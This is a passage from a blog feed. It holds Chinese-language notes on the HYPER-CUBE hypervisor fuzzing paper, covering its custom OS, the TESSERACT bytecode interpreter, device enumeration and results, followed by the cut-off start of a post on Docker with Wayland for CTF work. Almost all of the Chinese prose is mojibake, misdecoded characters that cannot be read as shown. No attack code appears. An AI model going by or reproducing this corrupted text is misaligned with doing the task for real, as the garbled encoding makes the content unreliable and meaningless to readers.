<code>TESSERACT</code> åˆ™å¯ä»¥ä¸æ‰€æœ‰å¯ç”¨æ¥å£äº¤äº’</li><li><code>Stable and Deterministic Fuzzing</code>ï¼šæ­¤å‰çš„ hypervisor fuzzer åŸºäº COTS OS ä»è€Œå¼•å…¥äº†å¤§é‡å±äºç³»ç»Ÿæœ¬èº«çš„ä¸ç¡®å®šæ€§ï¼Œä½œè€…å¼€å‘çš„æ“ä½œç³»ç»Ÿ <code>HYPER-CUBE OS</code> åˆ™ä»¥å¯¹ç¯å¢ƒçš„æ§åˆ¶æƒé¿å…äº†è¿™ä¸ªé—®é¢˜ï¼Œä¸”èƒ½è¿›è¡Œä¸€äº›æœ‰è¶£çš„æ“ä½œ</li></ul><h3 id="2-HYPER-CUBE-OS"><a href="#2-HYPER-CUBE-OS" class="headerlink" title="2) HYPER-CUBE OS"></a>2) HYPER-CUBE OS</h3><p>å®¢åˆ¶æ“ä½œç³»ç»Ÿ <code>HYPER-CUBE OS</code> ä¸ºè¯¥ fuzzer çš„æ ¸å¿ƒï¼Œå…¶å®ç°äº† <a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html">multiboot 2 è§„èŒƒ</a>ï¼Œå¹¶ä¸ºæˆ‘ä»¬çš„ fuzzer ï¼ˆ<code>TESSERACT</code>ï¼‰æä¾›äº†ä¸€ä¸ªé€šç”¨å¹³å°ï¼Œå…¶æœ‰ç€ä¸¤ä¸ªä¸»è¦ä»»åŠ¡ï¼šç‰©ç†å†…å­˜ç®¡ç†ä¸è®¾å¤‡æšä¸¾ï¼Œå‰è€…éœ€è¦ç®¡ç†æ‰€æœ‰çš„ç‰©ç†å†…å­˜ï¼Œåè€…åˆ™éœ€è¦æšä¸¾ MMIO ä¸ port I&#x2F;O çš„åœ°å€èŒƒå›´ï¼Œå¹¶ä¸ PIC&#x2F;APIC äº¤äº’ï¼Œæœ‰çš„ä¿¡æ¯ï¼ˆå¦‚ MMIO åŒºåŸŸï¼‰é€šè¿‡ BIOS&#x2F;UEFI ä¼ é€’ï¼Œè€Œæœ‰çš„ä¿¡æ¯ï¼ˆå¦‚ I&#x2F;O ç«¯å£ä¸ PCI è®¾å¤‡ï¼‰åˆ™åˆéœ€è¦æ‰‹åŠ¨æšä¸¾</p><h3 id="3-TESSERACT"><a href="#3-TESSERACT" class="headerlink" title="3) TESSERACT"></a>3) TESSERACT</h3><p><code>HYPER-CUBE OS</code> å¯åŠ¨åä¼šä¸ hypervisor è¿›è¡Œéšæœºäº¤äº’ï¼Œè¿™é€šè¿‡è‡ªå®šä¹‰å­—èŠ‚ç è§£é‡Šå™¨ <code>TESSERACT</code> å®šä¹‰ï¼Œå­—èŠ‚ç å¯ä»¥æ¥è‡ªäº VM å¤–ï¼Œä¹Ÿå¯ä»¥æ¥è‡ªäºè¯¥è§£é‡Šå™¨å†…ç½®çš„ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼Œå­—èŠ‚ç çš„è®¾è®¡å½¢å¼ä½¿å¾—ä»»æ„å­—èŠ‚ä¸²éƒ½æ˜¯ä¸€ä¸ªåˆæ³•ç¨‹åº</p><p>è§£é‡Šå™¨è§£ç æ—¶ä¼šå°†æ‰€æœ‰çš„å€¼æ¨¡åˆ°ä¸€ä¸ªèŒƒå›´ä¸­ï¼Œæ ¹æ® opcode è°ƒç”¨ä¸åŒçš„å¤„ç†å‡½æ•°ï¼ˆè¿›è¡Œå•ä¸ª&#x2F;å¤šä¸ªåŠ¨ä½œï¼‰ï¼›è§£é‡Šå™¨è¿˜ç»´æŠ¤ä¸€ç»„å•ä¸ªä¸º 4k é¡µçš„ä¼šè¢«è¢«å®šæœŸè¦†ç›–ä¸ºéšæœºæ•°æ®çš„ scratch åŒºåŸŸï¼Œè¿™ä½¿å¾— <code>TESSERACT</code> å¯ä»¥åœ¨å…¶ä¸Šåˆ›å»ºè‡ªå®šä¹‰æ•°æ®ç»“æ„ä½œä¸ºè¾“å…¥</p><h3 id="4-External-Tools"><a href="#4-External-Tools" class="headerlink" title="4) External Tools"></a>4) External Tools</h3><p>è¯¥ fuzzer çš„æœ€åä¸€éƒ¨åˆ†ä¸ºè¿è¡Œåœ¨ host ä¾§çš„ä¸‰ä¸ªç‹¬ç«‹çš„è¾…åŠ©å·¥å…·ï¼ˆé€šå¸¸åœ¨ fuzzing ä¹‹åä½¿ç”¨ï¼‰ï¼š</p><ul><li>logger åœ¨ fuzzing æ—¶å²šå§ VM çš„ä¸²å£é€šä¿¡å¹¶å­˜å‚¨ä»¥ä¾›åç»­åˆ†æ</li><li>minimization tool åœ¨æ‰¾åˆ° bug åä½¿ç”¨åŒæ ·çš„ç§å­é‡æ–°ç”Ÿæˆç¨‹åºå¹¶åœ¨éšæœºç§»é™¤éƒ¨åˆ†æ®µåè§‚æµ‹ç»“æœï¼Œç®—æ³•æ”¶æ•›åé€šå¸¸èƒ½è·å¾—åŒ…å«æ•°åæ¡æŒ‡ä»¤çš„ç¨‹åºï¼Œå‡ºäºè°ƒè¯•ç›®çš„æˆ‘ä»¬è¿˜å¯ä»¥å°† <code>TESSERACT</code> ä½œä¸ºç‹¬ç«‹çš„ ring 3 ç¨‹åºè¿è¡Œ</li><li>decompiler å°†ç»™å®šçš„ï¼ˆæœ€å°åŒ–ï¼‰å­—èŠ‚ç è½¬æ¢ä¸ºç­‰ä»·çš„ C ç¨‹åºä»¥åˆ†ææ‰¾åˆ°æ¼æ´çš„å­—èŠ‚æµç¨‹åºï¼Œè¿™æ ·çš„ C ç¨‹åºå¯ä»¥è¢«ç¼–è¯‘ä¸º HYPER-CUBE OS çš„ä¸€ä¸ªæ¨¡å—æˆ–æ˜¯æ’å…¥åˆ° COTS OS å†…æ ¸é©±åŠ¨ä¸­è¿›è¡Œè°ƒè¯•</li></ul><h1 id="0x04-Implementation-Details"><a href="#0x04-Implementation-Details" class="headerlink" title="0x04. Implementation Details"></a>0x04. Implementation Details</h1><blockquote><p>è¿™ä¸€èŠ‚å¾ˆå¤šåŸºç¡€çŸ¥è¯†ï¼Œæ‡’å¾—æ‘˜æŠ„å¤ªå¤šäº†</p></blockquote><h2 id="A-HYPER-CUBE-OS"><a href="#A-HYPER-CUBE-OS" class="headerlink" title="A. HYPER-CUBE OS"></a>A. HYPER-CUBE OS</h2><h3 id="1-Boot-Process"><a href="#1-Boot-Process" class="headerlink" title="1) Boot Process"></a>1) Boot Process</h3><p>åœ¨å¯åŠ¨é˜¶æ®µå›ºä»¶ä¼šä»ä¸åŒçš„å¤–è®¾ï¼ˆç§°ä¸º Option ROMsï¼‰ä¸­è½½å…¥ç¨‹åºä»¥æ£€æµ‹ç¡¬ä»¶å¹¶ç”Ÿæˆæ•°æ®ä¿¡æ¯ï¼ŒéšååŠ è½½ bootloader ä»¥è£…è½½å†…æ ¸ï¼Œmultiboot æ ‡å‡†è¢«åˆ¶å®šæ¥æ ‡å‡†åŒ– bootloader ï¼ˆå¹¶æ‰©å±•è‡³ç¬¬äºŒä»£ä»¥æ”¯æŒ UEFIï¼‰ä»¥åœ¨ä¸åŒ BIOS&#x2F;UEFI é—´é€šç”¨ï¼Œéµå¾ª multiboot2 çš„å†…æ ¸å¯ä»¥è¢«æ„å»ºä¸º ELF æ–‡ä»¶ï¼Œ<code>HYPER-CUBE OS</code> ä¾¿åŸºäº multiboot2 è§„èŒƒå¹¶ä½¿ç”¨ GRUB è¿›è¡Œå¼•å¯¼ï¼Œä»è€Œä½¿å¾—å…¶å¯ä»¥é€šè¿‡ä¼ ç»Ÿ BIOS æˆ– UEFI å›ºä»¶è¿›è¡Œå¯åŠ¨ï¼Œä¸”åœ¨å…¥å£ç‚¹ä¾¿è¿›å…¥ä¿æŠ¤æ¨¡å¼</p><ul><li><code>Initializing Interrupts</code>ï¼š<code>HYPER-CUBE OS</code> ä¼šé…ç½® PIC&#x2F;APIC ä»¥åˆå§‹åŒ–æ‰€æœ‰åŸºæœ¬çš„ä¸­æ–­&#x2F;å¼‚å¸¸çš„ handlersï¼Œå¹¶é€šè¿‡ masking OS å†…çš„æ‰€æœ‰ç»ˆç«¯å¯„å­˜å™¨ä»¥å±è”½äº†æ‰€æœ‰å¤–éƒ¨ä¸­æ–­ï¼Œä»è€Œç¡®ä¿ fuzzing è¿‡ç¨‹ä¸ä¼šè¢«ä¸­æ–­</li></ul><h3 id="2-Memory-Management"><a href="#2-Memory-Management" class="headerlink" title="2) Memory Management"></a>2) Memory Management</h3><p>ä½œè€…å®ç°äº†ä¸€ä¸ªå•æ¬¡åˆ†é…ä¸€æ•´å¼ é¡µé¢çš„ç®€æ˜“å †ç®¡ç†å™¨ï¼Œå‡å°‘äº†å†…å­˜ç¢ç‰‡å¹¶æé«˜äº†<del>æ’¸æ£’</del>å¥å£®æ€§ï¼Œå®é™…ä¸Šä»…åœ¨æšä¸¾è®¾å¤‡æ—¶ <code>HYPER-CUBE OS</code> ä¼šä¸º <code>TESSERACT</code> åˆ†é…å°‘é‡å†…å­˜ï¼Œå› æ­¤é¢å¤–å¼€é”€å¯ä»¥å¿½ç•¥ä¸è®¡</p><p>ç°ä»£æ“ä½œç³»ç»Ÿé€šå¸¸ä½¿ç”¨åˆ†é¡µæœºåˆ¶æ”¯æ’‘è™šæ‹Ÿç©ºé—´ï¼Œä½†ä¸€äº›ä»»åŠ¡ï¼ˆå¦‚é¡µè¡¨å’Œ MMIOï¼‰éœ€è¦ç›´æ¥è®¿é—®ç‰©ç†å†…å­˜ï¼Œå› æ­¤ <code>HYPER-CUBE OS</code> ç»´æŠ¤ä¸€ä¸ªä¸€å¯¹ä¸€ç›´æ¥æ˜ å°„åˆ°ç‰©ç†å†…å­˜çš„åŒºåŸŸï¼ˆ<code>0x0 ~ 0x100000</code>ï¼‰ï¼Œæ­¤å¤–ç”± BIOS&#x2F;UEFI ä¼ æ¥çš„å¯ç”¨ç‰©ç†å†…å­˜ä¿¡æ¯ä¼šè¢«ç”¨ä½œå†…æ ¸å †ï¼Œæœ€å <code>HYPER-CUBE OS</code> ä¼šåˆ›å»ºå¦ä¸€ä¸ªå¯¹ MMIO åŒºåŸŸçš„é‡æ˜ å°„ï¼Œå†…å­˜å¸ƒå±€å¦‚å›¾ 3 æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2023/10/27/EiusOdrowH4zgSp.png" alt="Fig. 3: Virtual memory layout of HYPER-CUBE"></p><h3 id="3-Device-Enumeration"><a href="#3-Device-Enumeration" class="headerlink" title="3) Device Enumeration"></a>3) Device Enumeration</h3><p>PCI è¿™æ ·çš„ç¡¬ä»¶è®¾å¤‡æˆ–æ˜¯ APIC æˆ– é«˜ç²¾ç¡®äº‹ä»¶è®¡æ—¶å™¨ï¼ˆHigh Precision Event Timerï¼ŒHPETï¼‰å¯ä»¥å°†å†…éƒ¨å¯„å­˜å™¨æ˜ å°„åˆ°ç‰©ç†å†…å­˜ä¸Šï¼Œè®¿é—®å¯¹åº”çš„ MMIO åŒºåŸŸåˆ™å¯ä»¥ç›´æ¥å½±å“è¿™äº›è®¾å¤‡çš„çŠ¶æ€ï¼Œ<code>HYPER-CUBE OS</code> ä¼šæšä¸¾å¯ç”¨æ¥ fuzzing çš„ä¸åŒæ¥å£ï¼Œè¿™éœ€è¦æšä¸¾æ‰€æœ‰å¤–è®¾æ‰€ç”¨çš„ MMIO åŠ port I&#x2F;O åœ°å€</p><ul><li><code>Core Components</code>ï¼šç”± APIC æˆ– HPET æä¾›çš„ MMIO åŒºåŸŸä¿¡æ¯é€šè¿‡åä¸º <code>é«˜çº§é…ç½®ä¸ç”µæºæ¥å£</code> ï¼ˆAdvanced Configuration and Power Interfaceï¼ŒACPIï¼‰è¡¨çš„å½¢å¼è¿›è¡Œæè¿°ï¼ŒHPET ä¸ APIC MMIO åŒºåŸŸçš„åŸºå€å­˜æ”¾åœ¨å¯¹åº”çš„ ACPI è¡¨ä¸­ï¼ˆç”± multiboot bootloader æä¾›ï¼‰ï¼ŒACPI è¡¨ä¸­æ‰€æœ‰çš„åŸºå€æŒ‡é’ˆéƒ½åœ¨ <code>TESSERACT</code> ä¸­æ³¨å†Œä¸º fuzzing ç›®æ ‡åœ°å€</li><li><code>PCI-/PCIe-Enumeration</code>ï¼š<code>HYPER-CUBE OS</code> ä¾èµ–äºä¼ ç»Ÿ PCI é…ç½® I&#x2F;O æ¥å£æˆ–åŸºäºä½äºå¢å¼ºé…ç½®æœºåˆ¶ï¼ˆ<code>Enhanced Configuration Mechanism</code>ï¼ŒECAMï¼‰åŸºæŒ‡é’ˆçš„ MMIO åŒºåŸŸçš„ç°ä»£ PCI é…ç½®ç©ºé—´è¿›è¡Œ PCI è®¾å¤‡æšä¸¾ï¼ŒECAM ä¿¡æ¯åŒæ ·å­˜æ”¾åœ¨ ACPI è¡¨ä¸­</li><li><code>ISA-Enumeration / I/O Port Probing</code>ï¼šISA è®¾å¤‡æ²¡æœ‰ç³»ç»Ÿçš„æšä¸¾ä¸æ£€æµ‹çš„åŠæ³•ï¼Œå› æ­¤ <code>HYPER-CUBE OS</code> ä¼šå¯¹æ‰€æœ‰çš„ 2<sup>16</sup> ä¸ªç«¯å£è¿›è¡Œè¯»å†™ï¼Œå‘ç”Ÿæ”¹å˜çš„ç«¯å£å€¼åˆ™è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªæ¨¡æ‹Ÿè®¾å¤‡</li></ul><h2 id="B-TESSERACT"><a href="#B-TESSERACT" class="headerlink" title="B. TESSERACT"></a>B. TESSERACT</h2><p><code>TESSERACT</code> æ˜¯ä¸€ä¸ªå¤æ‚æŒ‡ä»¤é›†è§£é‡Šå™¨ï¼Œæ€»çš„æ¥è¯´å®ç°äº†å¦‚ä¸‹æŒ‡ä»¤ï¼š</p><p><img src="https://s2.loli.net/2023/10/27/6qHpPGwKkvshNR1.png" alt="image.png"></p><p>å­—èŠ‚æµè¾“å…¥å°†è¢« <code>TESSERACT</code> è§£ç ä¸ºä¸åŒçš„æŒ‡ä»¤æ“ä½œï¼Œåœ¨æ²¡æœ‰å¤–éƒ¨å­—èŠ‚ç æµä½œä¸ºè¾“å…¥çš„æƒ…å†µä¸‹å…¶ä½¿ç”¨ä¼ªéšæœºæ•°ç”Ÿæˆå™¨æ¥ç”ŸæˆéšæœºæŒ‡ä»¤ï¼ˆå¦‚å›¾ 4 æ‰€ç¤ºï¼‰ï¼Œåœ¨æ‰¾åˆ°é€ æˆå´©æºƒçš„åˆå§‹ PRNG çŠ¶æ€åï¼Œä½œè€…ä½¿ç”¨ç›¸åŒçš„çŠ¶æ€é‡æ–°ç”Ÿæˆç›¸åŒçš„å­—èŠ‚ä¸²ï¼ˆå¯èƒ½é•¿è¾¾æ•°ç™¾ä¸‡åˆ°æ•°åƒä¸‡æ¡æŒ‡ä»¤ï¼‰ï¼Œå¹¶å°†å…¶åµŒå…¥åˆ° <code>HYPER-CUBE OS</code> é•œåƒä¸­è¿›è¡Œå¼•å¯¼ï¼Œè‹¥ä¾ç„¶å´©æºƒåˆ™ä¼šéšæœºåˆ é™¤ 50% æŒ‡ä»¤ç‰‡æ®µå¹¶é‡å¤æ­¤è¿‡ç¨‹ä»¥è·å–æœ€å°å­—èŠ‚ä¸²ï¼Œéšåé€šè¿‡åæ±‡ç¼–å™¨è½¬ä¸ºäººç±»å¯è¯»çš„ C ç¨‹åºå½¢å¼</p><p><img src="https://s2.loli.net/2023/10/27/JYXaqnIbLVBEy12.png" alt="Fig. 4: TESSERACT consuming a byte string provided either by a PRNG or an embedded payload. Upon receiving the byte string, TESSERACT decodes it into opcodes such as 1 and 2 . It then calls the handler that actually performs I/O operations."></p><h1 id="0x05-Evaluation"><a href="#0x05-Evaluation" class="headerlink" title="0x05. Evaluation"></a>0x05. Evaluation</h1><p>ä½œè€…å¸Œæœ›èƒ½å¤Ÿå›ç­”ä»¥ä¸‹å››ä¸ªç ”ç©¶é—®é¢˜ï¼š</p><ul><li>ä½¿ç”¨ <code>HYPER-CUBE</code> æ˜¯å¦èƒ½å¤Ÿåœ¨ä¸åŒ hypervisor ä¸­å‘ç°æ–°çš„æ¼æ´ï¼Ÿ</li><li>æ˜¯å¦èƒ½é‡æ–°å‘ç°é‚£äº›å·²çŸ¥çš„æ¼æ´ï¼ˆå¦‚ QEMU çš„ CVE-2015-3456ï¼‰ï¼Ÿ</li><li>ä¸å…¶ä»–çš„ hypervisor fuzzer ç›¸æ¯”åœ¨è¦†ç›–ç‡æ–¹é¢å¦‚ä½•ï¼Ÿ</li><li>ä¸å…¶ä»–çš„ hypervisor fuzzer ç›¸æ¯”åœ¨æ€§èƒ½æ–¹é¢å¦‚ä½•ï¼Ÿ</li></ul><blockquote><p>è´´å‡ ä¸ªè¡¨çœ‹çœ‹å®åŠ›ï¼Œå…·ä½“çš„åŸæ–‡å°±ä¸æ‘˜æŠ„äº†ï¼Œåæ­£å¾ˆå¼ºå°±å¯¹äº†ï¼Œå»ºè®®çœ‹åŸè®ºæ–‡</p></blockquote><p><img src="https://s2.loli.net/2023/10/27/Rti6dTquacA9WJU.png" alt="TABLE II: Reported bugs found by HYPER-CUBE."></p><p><img src="https://s2.loli.net/2023/10/27/rFPLTHKihf8VZ2k.png" alt="TABLE III: Previously known vulnerabilities in QEMU / KVM found by HYPER-CUBE (average time in seconds over 20 runs each Â± standard deviation)."></p><p><img src="https://s2.loli.net/2023/10/27/NsWtpZwlAk2xJ6L.png" alt="TABLE IV: Branch coverage and bugs found by HYPER-CUBE and VDF"></p><p><img src="https://s2.loli.net/2023/10/27/Mz5sy1NQApVh6OF.png" alt="TABLE V: Throughput of TESSERACT vs. GCC (with -O0)"></p><p><img src="https://s2.loli.net/2023/10/27/oUwZFAtBHdISCPy.png" alt="TABLE VI: Boot time comparison using QEMU 4.0.1-rc4 ASAN (average over 20 runs each Â± standard deviation)."></p><p><img src="https://s2.loli.net/2023/10/27/evFjpUbtR9TmZLE.png" alt="TABLE VII: Automatic emulator detection rate of HYPER-CUBE. #scanning indicates the number of interfaces identified by our scanning. #well-known denotes the number of ports that the scanning did not find, but were contained in our list of well-known ports. #baseline is the number of interfaces, as reported by the hypervisor."></p><h1 id="0x06-Related-Work"><a href="#0x06-Related-Work" class="headerlink" title="0x06. Related Work"></a>0x06. Related Work</h1><p>è¿‡å»çš„é¡¹ç›®ä½¿ç”¨å®¢åˆ¶æ“ä½œç³»ç»Ÿæ¥æµ‹è¯• hypervisorï¼Œä¾‹å¦‚ <a href="https://github.com/airbus-seclab/crashos">CrashOS</a> æ˜¯åŒ…å«äº†ä¸€ç»„æ‰‹å†™æµ‹è¯•ç”¨ä¾‹çš„ OSï¼Œä½†ä¸æä¾›å‘ç°æ–°æ¼æ´çš„æ–¹æ³•ï¼›Intel CHIPSEC å¥—ä»¶åˆ™æä¾›äº†ä¸åŒçš„ fuzz æ¨¡æ‹Ÿè®¾å¤‡çš„ç»„ä»¶ï¼›Ormandy åˆ™å†™äº†ä¸€ä¸ªç”¨äºåœ¨ä¸åŒ hypervisor ä¸­åˆ›å»ºéšæœº I&#x2F;O è®¿é—®çš„ <a href="https://www.semanticscholar.org/paper/An-Empirical-Study-into-the-Security-Exposure-to-of-Ormandy/b67dc496b84010aa4f2a0f909fb3cb4d36ba78a0">fuzzer</a>ï¼›Henderson ç­‰äººåˆ™æå‡ºäº†é€šè¿‡ä¿®æ”¹å¼€æº hypervisor å¹¶æä¾› AFL æ”¯æŒæ¥ fuzz ç‰¹å®šæ¨¡æ‹Ÿè®¾å¤‡çš„<a href="https://hhannuaa.github.io/papers/VDF_raid17.pdf">æ–¹æ³•</a>ï¼›Tang ç­‰äººåˆ™é€šè¿‡[åœ¨ QEMU çš„ SeaBIOS ä¸Šå®ç°æ¥å£](<a href="https://www.blackhat.com/docs/eu-16/materials/">https://www.blackhat.com/docs/eu-16/materials/</a><br>eu-16-Li-When-Virtualization-Encounters-AFL-APortable-Virtual-Device-Fuzzing-Framework-WithAFL-wp.pdf)ä»¥æä¾› AFL ä¸ QEMU é—´çš„äº’ç›¸æ“ä½œæ€§ï¼›æ¥è‡ª MWR Labs å’Œå¾®è½¯å®‰å…¨ç ”ç©¶ä¸é˜²å¾¡éƒ¨é—¨çš„ Amardeep Chana åˆ™å¼•å…¥äº†ç”¨äºæ¨¡ç³Šæµ‹è¯• Hyper-V hypercallï¼ˆVMBusï¼‰çš„<a href="https://labs.mwrinfosecurity.com/blog/venturesinto-hyper-v-part-1-fuzzing-hypercalls/">æ¨¡ç³Šæµ‹è¯•å·¥å…·</a>ï¼ˆé™„åŠ <a href="https://blogs.technet.microsoft.com/srd/2019/01/28/fuzzing-para-virtualizeddevices-in-hyper-v/">é“¾æ¥</a>ï¼‰</p><h1 id="0x07-Discussion"><a href="#0x07-Discussion" class="headerlink" title="0x07. Discussion"></a>0x07. Discussion</h1><p>è¿™ä¸ªå·¥å…·å¾ˆå¼ºå¤§ï¼Œä½†ä»æœ‰ä¸€äº›å¯ä»¥æå‡çš„ç‚¹</p><h2 id="A-Coverage-Guided-Hypervisor-Fuzzing"><a href="#A-Coverage-Guided-Hypervisor-Fuzzing" class="headerlink" title="A. Coverage-Guided Hypervisor Fuzzing"></a>A. Coverage-Guided Hypervisor Fuzzing</h2><p>ä¸è¦†ç›–ç‡ä¿¡æ¯è¿›è¡Œç»“åˆå¯èƒ½ä¼šæé«˜å‘ç°æ¼æ´çš„æ¦‚ç‡ï¼Œä¸ºäº†å‘ç°æ–°çš„è¦†ç›–èŒƒå›´æˆ–æœ‰è¶£è¡Œä¸ºï¼Œéœ€è¦é€æ­¥æ„å»º hypervisor ä¸­çš„çŠ¶æ€ï¼Œè€Œå¯èƒ½çš„æ“ä½œç©ºé—´å·¨å¤§ï¼Œè®©çŠ¶æ€å¢é•¿åˆ°æœ‰è¶£çš„äº‹æƒ…å‘ç”Ÿï¼ˆå¦‚ crashï¼‰ä¼¼ä¹ä¼šæå¤§å¢åŠ ååé‡</p><h2 id="B-Hyper-V"><a href="#B-Hyper-V" class="headerlink" title="B. Hyper-V"></a>B. Hyper-V</h2><p><code>HYPER-CUBE</code> æš‚ä¸æ”¯æŒ <code>Hyper-V</code> ï¼Œå› ä¸ºå…¶ä¸æ”¯æŒ 64 ä½ UEFI å¼•å¯¼ï¼ˆ<code>Hyper-V</code> è¦æ±‚æ“ä½œç³»ç»Ÿä»¥æ­¤æ¨¡å¼è¿›è¡Œå¼•å¯¼ï¼‰ï¼›åŒæ—¶ HYPER-CUBE å¯¹åŠè™šæ‹ŸåŒ–çš„æ”¯æŒæœ‰é™ï¼Œç›®å‰åªå®ç°äº†ä¸å¤ªå¯èƒ½å•ç‹¬è§¦å‘æœ‰è¶£è¦†ç›–çš„é€šç”¨æ“ä½œ</p><h1 id="0x08-Conclusion"><a href="#0x08-Conclusion" class="headerlink" title="0x08. Conclusion"></a>0x08. Conclusion</h1><blockquote><p>æ²¡å•¥å¥½è¯´çš„</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;hyper çš„ ä¸æ˜¯ visorï¼Œæ˜¯æˆ‘ cube å“’ï¼&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="FUZZ" scheme="https://arttnba3.github.io/tags/FUZZ/"/>
    
    <category term="è®ºæ–‡ç¬”è®°" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
    <category term="è™šæ‹ŸåŒ–" scheme="https://arttnba3.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="Qemu" scheme="https://arttnba3.github.io/tags/Qemu/"/>
    
  </entry>
  
  <entry>
    <title>ã€OPS.0x01ã€‘ä¸º Docker è¿æ¥ Wayland å›¾å½¢ç¯å¢ƒ</title>
    <link href="https://arttnba3.github.io/2023/10/25/OPS-0X01-DOCKER_WAYLAND_GUI/"/>
    <id>https://arttnba3.github.io/2023/10/25/OPS-0X01-DOCKER_WAYLAND_GUI/</id>
    <published>2023-10-24T17:02:45.000Z</published>
    <updated>2023-12-29T14:26:42.160Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ä¸€æ—¥ï¼ŒDocker å†å…¥æ¡Œé¢ GUI å¢ƒç•Œ</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><blockquote><p>å¦‚æœä½ åªæ˜¯å¯»æ±‚ docker æ¥é€š Wayland è·‘å›¾å½¢ç•Œé¢çš„è§£å†³æ–¹æ¡ˆï¼Œä¸æƒ³çœ‹ç¬”è€…åæ§½çš„å„ç§æ‰¹è¯ï¼Œè¯·ç›´æ¥è·³è¿‡è¿™ä¸€å°èŠ‚ ï¼šï¼‰</p><p>å¦‚æœä½ æƒ³è¦çš„æ˜¯ docker æ¥é€šæ˜¾å¡çš„è§£å†³æ–¹æ¡ˆï¼Œé‚£ä½ èµ°é”™è·¯äº†ï¼Œè¿™ä¸ªæ–¹æ¡ˆåœ¨<a href="https://arttnba3.cn/2023/08/31/OPS-0X00-DOCKER_ON_SERVER/#0x02-%E5%88%9B%E5%BB%BA%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E6%98%BE%E5%8D%A1%E7%9A%84-docker-%E7%8E%AF%E5%A2%83">éš”å£</a></p></blockquote><p>ç¬”è€…å¤§ä¸€åˆšå¼€å§‹å­¦ Pwn çš„æ—¶å€™å°±å› ç¯å¢ƒé—®é¢˜è€Œæ„Ÿåˆ°è‹¦æ‰‹ï¼Œä¸Šä¸€é¢˜çš„ç¯å¢ƒå¯èƒ½æ˜¯ <code>Ubuntu 16.04</code> å¸¦ä¸ª <code>glibc-2.23</code> åªæœ‰ <code>fastbin</code>ï¼Œä¸‹ä¸€é¢˜å¯èƒ½åˆå˜æˆ <code>Ubuntu 18.04</code> å¸¦ä¸ª <code>glibc-2.27</code> åˆå¤šä¸€ä¸ª <code>tcache</code> ï¼Œç„¶åç¬”è€…æœ¬åœ°ç¯å¢ƒåˆæ˜¯ <code>Ubuntu 20.04</code> å¸¦ä¸ª <code>glibc-2.31</code> çš„åŒæ—¶ <code>tcache</code> åˆå¤šå¸¦ä¸€ä¸ª keyï¼Œå¯¹äºé‚£æ—¶å€™ä»¥ glibc heap åˆ©ç”¨ä½œä¸ºä¸»æµçš„ Pwn é¢˜è€Œè¨€è‹¥æ˜¯æœ¬åœ° libc ç‰ˆæœ¬ä¸åŒåˆ™æ ¹æœ¬æ²¡æœ‰åŠæ³•å¾ˆå¥½åœ°è°ƒè¯•å¥½æ‰“è¿œç¨‹</p><p>é€šè¿‡ <code>LD_PRELOAD</code> å‚æ•°åœ¨ç¨‹åºæ‰§è¡Œå‰ <em>é¢„å…ˆåŠ è½½ libc</em> æˆ–è®¸æŸäº›ç¨‹åº¦ä¸Šæ˜¯ä¸€ä¸ªå¯è¡Œçš„åŠæ³•ï¼Œè‡³å°‘ libc å¤§ç‰ˆæœ¬ç›¸åŒçš„æƒ…å†µä¸‹è½½å…¥ä¸åŒçš„å°ç‰ˆæœ¬åŸºæœ¬ä¸Šæ˜¯æ²¡é—®é¢˜çš„ï¼Œä½†æ˜¯ç”±äºä¸åŒç³»ç»Ÿç¯å¢ƒä¸­ ld ç‰ˆæœ¬ä¸åŒçš„ç¼˜æ•…ï¼Œå¯¹äºè·¨ ld ç‰ˆæœ¬åŠ è½½ä¸åŒç‰ˆæœ¬çš„ libc åˆ™åˆå¯èƒ½ç›´æ¥ segmentation fault äº†</p><p>è™½ç„¶ Linux çš„ç”¨æˆ·ç¯å¢ƒå¹¶ä¸ä¼¼ Windows é‚£æ ·æœ‰ç€å¼ºå£®çš„äºŒè¿›åˆ¶å‰å‘å…¼å®¹æ€§ï¼Œä½†æ˜¯ç”¨æˆ·ç¯å¢ƒä¾æ‰˜äºå†…æ ¸ç¯å¢ƒã€ä¾æ‰˜äºå†…æ ¸å‘ç”¨æˆ·æ€æš´éœ²çš„æ¥å£â€”â€”ç³»ç»Ÿè°ƒç”¨ï¼Œè€Œè¿™å¹¶ä¸æ˜¯ä¼šè½»æ˜“å‘ç”Ÿå˜åŠ¨ä»¥åŠå…¼å®¹æ€§ç ´åçš„ä¸€ä¸ªä¸œè¥¿ï¼Œç”±æ­¤ï¼Œé€šè¿‡<strong>é‡æ–°å¼€è¾Ÿä¸€ä¸ªå¯¹åº”çš„æ–°çš„ç”¨æˆ·ç¯å¢ƒçš„æ–¹å¼</strong>â€”â€” å³å½¢å¦‚ <code>Docker</code> è¿™æ ·çš„<strong>æ“ä½œç³»ç»Ÿå±‚ä¸Šçš„è™šæ‹ŸåŒ–æ–¹æ¡ˆ</strong>ï¼Œæˆ‘ä»¬ä¾¿èƒ½éå¸¸ç®€å•åœ°æ­å»ºä¸åŒçš„ Pwn é¢˜æ‰€å¯¹åº”çš„åŸå§‹ç¯å¢ƒ</p><blockquote><p><del>å½“ç„¶ï¼Œè¿™é‡Œå°±ä¸å¾—ä¸æ<a href="https://arttnba3.cn/2021/05/20/PIECES-0X00-SHELL_OUTSIDE-0-LOST_UMBRELLA/#arttnba3-arttnba3-cn-x2F-cat-flag">æŸäº›è¿ libc éƒ½ä¸ç»™çš„æ˜¯äººæ˜¯é¬¼å…¨é 